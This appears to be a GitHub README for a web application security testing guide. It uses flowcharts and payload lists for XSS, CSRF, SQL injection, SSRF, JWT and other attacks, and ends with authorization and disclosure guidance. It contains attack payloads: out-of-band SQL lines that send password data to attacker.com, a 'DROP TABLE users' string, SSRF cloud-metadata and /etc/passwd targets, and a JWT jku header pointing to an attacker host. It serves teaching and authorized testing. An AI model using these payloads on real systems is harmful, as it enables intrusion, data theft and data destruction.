# Web Application Security Research & Attack Methodologies

**Author:** S. Tamilselvan - Security Researcher  
**Project:** Comprehensive Web Application Security Testing Framework  
**Version:** 1.0  
**Last Updated:** 2024

---

## 📋 Table of Contents

1. [Project Overview](#project-overview)
2. [Attack Types Covered](#attack-types-covered)
3. [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
4. [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
5. [SQL Injection](#sql-injection)
6. [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
7. [Directory Brute Force](#directory-brute-force)
8. [JWT Token Misconfigurations](#jwt-token-misconfigurations)
9. [Additional Attack Vectors](#additional-attack-vectors)
10. [Testing Methodology](#testing-methodology)
11. [Tools & Resources](#tools--resources)
12. [Disclaimer](#disclaimer)

---

## 🎯 Project Overview

This repository contains comprehensive research and methodologies for identifying and exploiting various web application security vulnerabilities. The project serves as an educational resource for security researchers, penetration testers, and developers to understand common attack vectors and their mitigation strategies.

### 🎯 Objectives
- Document common web application vulnerabilities
- Provide step-by-step attack methodologies
- Create visual flowcharts for attack processes
- Offer practical examples and proof-of-concepts
- Establish testing frameworks for security assessment

---

## 🔍 Attack Types Covered

| Attack Type | Severity | Frequency | Impact |
|-------------|----------|-----------|---------|
| SQL Injection | Critical | High | Data Breach, System Compromise |
| XSS (Cross-Site Scripting) | High | Very High | Session Hijacking, Data Theft |
| CSRF (Cross-Site Request Forgery) | Medium | Medium | Unauthorized Actions |
| SSRF (Server-Side Request Forgery) | High | Medium | Internal Network Access |
| Directory Brute Force | Medium | High | Information Disclosure |
| JWT Misconfigurations | High | Medium | Authentication Bypass |
| Command Injection | Critical | Medium | System Compromise |
| File Upload Vulnerabilities | High | Medium | Remote Code Execution |

---

## 🚨 XSS (Cross-Site Scripting)

### Overview
Cross-Site Scripting (XSS) attacks occur when an application includes untrusted data in a web page without proper validation or escaping.

### Types of XSS

#### 1. Reflected XSS
```
User Input → Server Processing → Immediate Response → Script Execution
```

#### 2. Stored XSS
```
Malicious Input → Database Storage → Page Rendering → Script Execution
```

#### 3. DOM-based XSS
```
Client-Side Processing → DOM Manipulation → Script Execution
```

### XSS Attack Flowchart

```mermaid
flowchart TD
    A[Start XSS Testing] --> B[Identify Input Fields]
    B --> C[Test Basic Payloads]
    C --> D{Payload Executed?}
    D -->|Yes| E[Confirm XSS Vulnerability]
    D -->|No| F[Try Advanced Payloads]
    F --> G{WAF/Filter Present?}
    G -->|Yes| H[Bypass Techniques]
    G -->|No| I[Test Different Contexts]
    H --> J{Bypass Successful?}
    J -->|Yes| E
    J -->|No| K[Document Findings]
    I --> L{Context Vulnerable?}
    L -->|Yes| E
    L -->|No| K
    E --> M[Exploit Development]
    M --> N[Impact Assessment]
    N --> O[Report Generation]
    K --> O
```

### Common XSS Payloads

```javascript
// Basic XSS
<script>alert('XSS')</script>

// Event-based XSS
<img src=x onerror=alert('XSS')>

// JavaScript URL
javascript:alert('XSS')

// SVG XSS
<svg onload=alert('XSS')>

// Bypass Filters
<ScRiPt>alert('XSS')</ScRiPt>
```

### XSS Testing Methodology

1. **Input Identification**
   - Form fields
   - URL parameters
   - HTTP headers
   - Cookie values

2. **Payload Testing**
   - Basic script tags
   - Event handlers
   - JavaScript URLs
   - Data URIs

3. **Context Analysis**
   - HTML context
   - Attribute context
   - JavaScript context
   - CSS context

---

## 🔒 CSRF (Cross-Site Request Forgery)

### Overview
CSRF attacks force authenticated users to execute unwanted actions on web applications where they're authenticated.

### CSRF Attack Flowchart

```mermaid
flowchart TD
    A[Start CSRF Testing] --> B[Identify State-Changing Actions]
    B --> C[Check CSRF Protection]
    C --> D{CSRF Token Present?}
    D -->|No| E[Craft Malicious Request]
    D -->|Yes| F[Test Token Validation]
    F --> G{Token Properly Validated?}
    G -->|No| H[Bypass Token Validation]
    G -->|Yes| I[Test SameSite Cookies]
    H --> E
    I --> J{SameSite Protection?}
    J -->|No| E
    J -->|Yes| K[Test Referer Header]
    K --> L{Referer Validation?}
    L -->|No| E
    L -->|Yes| M[Document Protection]
    E --> N[Create PoC]
    N --> O[Test Attack]
    O --> P{Attack Successful?}
    P -->|Yes| Q[Impact Assessment]
    P -->|No| R[Refine Attack]
    R --> O
    Q --> S[Report Generation]
    M --> S
```

### CSRF Attack Examples

```html
<!-- GET-based CSRF -->
<img src="http://vulnerable-site.com/transfer?amount=1000&to=attacker" />

<!-- POST-based CSRF -->
<form action="http://vulnerable-site.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="to" value="attacker" />
    <input type="submit" value="Click me!" />
</form>

<!-- JavaScript CSRF -->
<script>
fetch('http://vulnerable-site.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({amount: 1000, to: 'attacker'}),
    headers: {'Content-Type': 'application/json'}
});
</script>
```

---

## 💉 SQL Injection

### Overview
SQL Injection occurs when user input is improperly sanitized and directly concatenated into SQL queries.

### SQL Injection Types

1. **Classic SQL Injection**
2. **Blind SQL Injection**
3. **Time-based Blind SQL Injection**
4. **Union-based SQL Injection**
5. **Error-based SQL Injection**

### SQL Injection Attack Flowchart

```mermaid
flowchart TD
    A[Start SQL Injection Testing] --> B[Identify Input Parameters]
    B --> C[Test Basic Payloads]
    C --> D{Error Messages?}
    D -->|Yes| E[Error-based Exploitation]
    D -->|No| F[Test Boolean-based Blind]
    F --> G{Different Responses?}
    G -->|Yes| H[Boolean-based Exploitation]
    G -->|No| I[Test Time-based Blind]
    I --> J{Time Delays?}
    J -->|Yes| K[Time-based Exploitation]
    J -->|No| L[Test Union-based]
    L --> M{Union Successful?}
    M -->|Yes| N[Union-based Exploitation]
    M -->|No| O[Advanced Techniques]
    E --> P[Database Enumeration]
    H --> P
    K --> P
    N --> P
    O --> Q{WAF Present?}
    Q -->|Yes| R[WAF Bypass Techniques]
    Q -->|No| S[Document Findings]
    R --> T{Bypass Successful?}
    T -->|Yes| P
    T -->|No| S
    P --> U[Data Extraction]
    U --> V[Privilege Escalation]
    V --> W[Impact Assessment]
    W --> X[Report Generation]
    S --> X
```

### Common SQL Injection Payloads

```sql
-- Basic Authentication Bypass
' OR '1'='1' --
' OR 1=1 --
admin'--

-- Union-based Injection
' UNION SELECT 1,2,3,4 --
' UNION SELECT null,username,password,null FROM users --

-- Error-based Injection
' AND (SELECT COUNT(*) FROM information_schema.tables) --
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --

-- Time-based Blind Injection
' AND (SELECT SLEEP(5)) --
'; WAITFOR DELAY '00:00:05' --

-- Boolean-based Blind Injection
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --
```

---

## 🌐 SSRF (Server-Side Request Forgery)

### Overview
SSRF vulnerabilities allow attackers to make requests from the vulnerable server to internal or external resources.

### SSRF Attack Flowchart

```mermaid
flowchart TD
    A[Start SSRF Testing] --> B[Identify URL Parameters]
    B --> C[Test Internal IP Ranges]
    C --> D{Internal Access?}
    D -->|Yes| E[Enumerate Internal Services]
    D -->|No| F[Test Localhost Variations]
    F --> G{Localhost Access?}
    G -->|Yes| E
    G -->|No| H[Test Protocol Variations]
    H --> I{Different Protocols Work?}
    I -->|Yes| J[Protocol-specific Exploitation]
    I -->|No| K[Test URL Encoding]
    K --> L{Encoding Bypass?}
    L -->|Yes| E
    L -->|No| M[Test DNS Rebinding]
    E --> N[Port Scanning]
    N --> O[Service Enumeration]
    O --> P[Credential Harvesting]
    P --> Q[Cloud Metadata Access]
    Q --> R[Impact Assessment]
    J --> R
    M --> S{DNS Rebinding Works?}
    S -->|Yes| R
    S -->|No| T[Document Findings]
    R --> U[Report Generation]
    T --> U
```

### SSRF Payloads

```
# Internal Network Scanning
http://127.0.0.1:80
http://localhost:22
http://192.168.1.1:80
http://10.0.0.1:3306

# Cloud Metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Protocol Variations
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stats

# Bypass Techniques
http://127.1:80
http://0x7f000001:80
http://2130706433:80
```

---

## 📁 Directory Brute Force

### Overview
Directory brute force attacks attempt to discover hidden directories and files on web servers.

### Directory Brute Force Flowchart

```mermaid
flowchart TD
    A[Start Directory Brute Force] --> B[Gather Target Information]
    B --> C[Select Wordlists]
    C --> D[Configure Tools]
    D --> E[Start Brute Force]
    E --> F{Response Analysis}
    F -->|200 OK| G[Valid Directory Found]
    F -->|403 Forbidden| H[Protected Directory]
    F -->|404 Not Found| I[Continue Scanning]
    F -->|301/302 Redirect| J[Follow Redirects]
    G --> K[Enumerate Contents]
    H --> L[Bypass Techniques]
    J --> M[Analyze Redirect Target]
    K --> N[Recursive Scanning]
    L --> O{Bypass Successful?}
    O -->|Yes| K
    O -->|No| P[Document Finding]
    M --> Q{Interesting Target?}
    Q -->|Yes| K
    Q -->|No| I
    N --> R[File Discovery]
    R --> S[Sensitive Data Check]
    S --> T[Impact Assessment]
    I --> U{Scan Complete?}
    U -->|No| E
    U -->|Yes| V[Compile Results]
    P --> V
    T --> V
    V --> W[Report Generation]
```

### Directory Brute Force Tools & Wordlists

```bash
# Common Tools
gobuster dir -u http://target.com -w /path/to/wordlist
dirb http://target.com /path/to/wordlist
dirsearch -u http://target.com -w /path/to/wordlist

# Common Directories
/admin
/backup
/config
/database
/logs
/test
/dev
/api
/uploads
/.git
```

---

## 🔑 JWT Token Misconfigurations

### Overview
JSON Web Tokens (JWT) vulnerabilities arise from improper implementation, weak secrets, or algorithm confusion.

### JWT Attack Flowchart

```mermaid
flowchart TD
    A[Start JWT Testing] --> B[Capture JWT Token]
    B --> C[Decode JWT Structure]
    C --> D[Analyze Header]
    D --> E{Algorithm Check}
    E -->|none| F[None Algorithm Attack]
    E -->|HS256| G[Weak Secret Testing]
    E -->|RS256| H[Algorithm Confusion]
    F --> I[Remove Signature]
    G --> J[Brute Force Secret]
    H --> K[Convert to HS256]
    I --> L[Modify Payload]
    J --> M{Secret Found?}
    M -->|Yes| N[Sign New Token]
    M -->|No| O[Dictionary Attack]
    K --> P[Use Public Key as Secret]
    L --> Q[Test Modified Token]
    N --> Q
    O --> R{Dictionary Success?}
    R -->|Yes| N
    R -->|No| S[Test Key Confusion]
    P --> Q
    S --> T[Test JKU/X5U Headers]
    T --> U[Test Kid Parameter]
    U --> V[SQL Injection in Kid]
    V --> W[Path Traversal in Kid]
    Q --> X{Token Accepted?}
    X -->|Yes| Y[Privilege Escalation]
    X -->|No| Z[Try Different Approach]
    Y --> AA[Impact Assessment]
    W --> AA
    Z --> BB[Document Findings]
    AA --> CC[Report Generation]
    BB --> CC
```

### JWT Attack Techniques

```javascript
// None Algorithm Attack
{
  "alg": "none",
  "typ": "JWT"
}

// Algorithm Confusion (RS256 to HS256)
// Use public key as HMAC secret

// Weak Secret Brute Force
const secrets = ['secret', '123456', 'password', 'jwt_secret'];

// JKU Header Manipulation
{
  "alg": "RS256",
  "jku": "http://attacker.com/jwks.json"
}

// Kid Parameter Injection
{
  "alg": "HS256",
  "kid": "../../../public/key.pem"
}
```

---

## 🔧 Additional Attack Vectors

### Command Injection

```mermaid
flowchart TD
    A[Command Injection Testing] --> B[Identify Input Parameters]
    B --> C[Test Basic Payloads]
    C --> D{Command Executed?}
    D -->|Yes| E[Confirm Vulnerability]
    D -->|No| F[Try Bypass Techniques]
    F --> G[Filter Evasion]
    G --> H{Bypass Successful?}
    H -->|Yes| E
    H -->|No| I[Document Findings]
    E --> J[Privilege Escalation]
    J --> K[System Enumeration]
    K --> L[Impact Assessment]
```

### File Upload Vulnerabilities

```mermaid
flowchart TD
    A[File Upload Testing] --> B[Test File Extensions]
    B --> C{Upload Successful?}
    C -->|Yes| D[Test Execution]
    C -->|No| E[Bypass Restrictions]
    E --> F[Double Extensions]
    F --> G[MIME Type Manipulation]
    G --> H[Magic Bytes Modification]
    H --> I{Bypass Successful?}
    I -->|Yes| D
    I -->|No| J[Document Restrictions]
    D --> K{Code Executed?}
    K -->|Yes| L[Remote Code Execution]
    K -->|No| M[Path Traversal Test]
    L --> N[System Compromise]
    M --> O[Directory Traversal]
```

---

## 🧪 Testing Methodology

### 1. Reconnaissance Phase
```mermaid
flowchart LR
    A[Target Identification] --> B[Information Gathering]
    B --> C[Technology Stack Analysis]
    C --> D[Attack Surface Mapping]
```

### 2. Vulnerability Assessment
```mermaid
flowchart LR
    A[Automated Scanning] --> B[Manual Testing]
    B --> C[Vulnerability Validation]
    C --> D[Impact Analysis]
```

### 3. Exploitation Phase
```mermaid
flowchart LR
    A[Proof of Concept] --> B[Exploit Development]
    B --> C[Privilege Escalation]
    C --> D[Persistence]
```

### 4. Post-Exploitation
```mermaid
flowchart LR
    A[Data Extraction] --> B[Lateral Movement]
    B --> C[Impact Documentation]
    C --> D[Remediation Guidance]
```

---

## 🛠️ Tools & Resources

### Automated Scanners
- **OWASP ZAP** - Web application security scanner
- **Burp Suite** - Web vulnerability scanner
- **Nikto** - Web server scanner
- **SQLMap** - SQL injection tool

### Manual Testing Tools
- **Burp Suite Professional** - Manual testing proxy
- **OWASP WebGoat** - Vulnerable application for practice
- **Damn Vulnerable Web Application (DVWA)** - Practice environment
- **Postman** - API testing tool

### Wordlists & Payloads
- **SecLists** - Security testing wordlists
- **PayloadsAllTheThings** - Payload repository
- **FuzzDB** - Attack patterns database
- **OWASP Testing Guide** - Testing methodology

### Custom Scripts
```bash
# XSS Testing Script
#!/bin/bash
payloads=("<script>alert('XSS')</script>" "<img src=x onerror=alert('XSS')>")
for payload in "${payloads[@]}"; do
    curl -X POST -d "input=$payload" http://target.com/search
done

# SQL Injection Testing
#!/bin/bash
sqlpayloads=("' OR '1'='1' --" "' UNION SELECT 1,2,3 --")
for payload in "${sqlpayloads[@]}"; do
    curl "http://target.com/login?username=admin&password=$payload"
done
```

---

## 📊 Vulnerability Assessment Matrix

| Vulnerability | CVSS Score | Exploitability | Impact | Detection Difficulty |
|---------------|------------|----------------|---------|---------------------|
| SQL Injection | 9.0 | High | Critical | Medium |
| XSS | 7.5 | High | High | Easy |
| CSRF | 6.5 | Medium | Medium | Medium |
| SSRF | 8.0 | Medium | High | Hard |
| JWT Misconfiguration | 7.0 | Medium | High | Medium |
| Command Injection | 9.5 | High | Critical | Medium |
| File Upload | 8.5 | High | Critical | Easy |

---

## 🔍 Research Methodology

### Phase 1: Information Gathering
1. **Target Analysis**
   - Domain enumeration
   - Technology identification
   - Service discovery
   - Architecture analysis

2. **Attack Surface Mapping**
   - Input parameter identification
   - Authentication mechanisms
   - Session management
   - API endpoints

### Phase 2: Vulnerability Discovery
1. **Automated Testing**
   - Vulnerability scanners
   - Fuzzing tools
   - Static analysis
   - Dynamic analysis

2. **Manual Testing**
   - Logic flaw identification
   - Business logic testing
   - Custom payload development
   - Edge case analysis

### Phase 3: Exploitation & Impact
1. **Proof of Concept Development**
   - Exploit creation
   - Payload refinement
   - Bypass technique development
   - Automation scripting

2. **Impact Assessment**
   - Data exposure analysis
   - System compromise evaluation
   - Business impact calculation
   - Risk rating assignment

---

## 📈 Security Testing Checklist

### Pre-Testing Phase
- [ ] Obtain proper authorization
- [ ] Define scope and limitations
- [ ] Set up testing environment
- [ ] Prepare testing tools
- [ ] Document baseline security posture

### Testing Phase
- [ ] Perform reconnaissance
- [ ] Conduct vulnerability assessment
- [ ] Execute manual testing
- [ ] Validate findings
- [ ] Document evidence

### Post-Testing Phase
- [ ] Compile comprehensive report
- [ ] Provide remediation guidance
- [ ] Conduct risk assessment
- [ ] Present findings to stakeholders
- [ ] Support remediation efforts

---

## 🚀 Advanced Attack Techniques

### 1. Polyglot Payloads
```javascript
// XSS + SQL Injection Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

### 2. WAF Bypass Techniques
```javascript
// Case variation
<ScRiPt>alert(1)</ScRiPt>

// Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;

// Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### 3. Advanced SQL Injection
```sql
-- Stacked queries
'; DROP TABLE users; --

-- Out-of-band data exfiltration
'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test.txt')); --

-- DNS exfiltration
'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(password) FROM users WHERE id=1), '.dns.attacker.com\\test')); --
```

---

## 📚 Educational Resources

### Books
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "OWASP Testing Guide v4"
- "SQL Injection Attacks and Defense" by Justin Clarke
- "XSS Attacks: Cross Site Scripting Exploits and Defense"

### Online Resources
- OWASP Top 10
- PortSwigger Web Security Academy
- HackerOne Hacktivity
- Bug Bounty Platforms

### Practice Environments
- WebGoat
- Mutillidae
- bWAPP

---

## 🔒 Responsible Disclosure

### Guidelines
1. **Authorization**: Only test applications you own or have explicit permission to test
2. **Scope**: Stay within defined testing boundaries
3. **Impact**: Minimize potential damage during testing
4. **Documentation**: Maintain detailed records of testing activities
5. **Reporting**: Follow responsible disclosure practices

### Disclosure Timeline
1. **Day 0**: Vulnerability discovered
2. **Day 1-7**: Initial report to vendor
3. **Day 30**: Follow-up if no response
4. **Day 90**: Public disclosure consideration
5. **Day 180**: Full public disclosure

---

## 📞 Contact Information

**Security Researcher:** S. Tamilselvan  
**Specialization:** Web Application Security, Penetration Testing  
**Research Focus:** Advanced Attack Methodologies & Defense Strategies  

---

## ⚠️ Disclaimer

This repository is created for educational and research purposes only. The information, tools, and techniques described herein should only be used on systems you own or have explicit permission to test. 

**Important Notes:**
- Unauthorized access to computer systems is illegal
- Always obtain proper authorization before testing
- Use this information responsibly and ethically
- The author is not responsible for any misuse of this information
- This research is intended to improve security awareness and defense capabilities

**Legal Compliance:**
- Follow all applicable laws and regulations
- Respect privacy and confidentiality
- Adhere to responsible disclosure practices
- Maintain professional ethics in security research

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](https://cyberwolf-career-guidance.web.app/) file for details.

---

**Last Updated:** December 2025  
**Version:** 1.0  
**Maintained by:** S. Tamilselvan - Security Researcher

---

**Security is not a product, but a process.**
